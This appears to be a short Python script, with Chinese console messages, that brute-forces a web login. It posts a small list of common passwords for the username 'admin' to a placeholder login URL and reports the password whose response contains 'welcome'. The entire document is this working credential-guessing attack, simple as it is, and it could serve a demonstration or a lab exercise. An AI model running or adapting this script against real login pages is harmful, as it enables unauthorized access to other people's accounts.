import requests

target_url = "Http://example.com/login"

passwords = ["123456", "password", "admin123", "correct_password777"]

username = "admin"

print(f"[*] 開始對帳號{username} 進行偵訊...")

for pwd in passwords:
    
    data = {
        "user": username,
        "pass": pwd
    }

    response = requests.post(target_url,data=data)

    if "welcome" in response.text:
        print(f"[!] 抓到了!正確密碼是: {pwd}")
        break
    else:
        print(f"[-] 測試密碼 {pwd} ... 失敗 (回傳長度: {len(response.text)})")

print("[*] 偵訊結束。")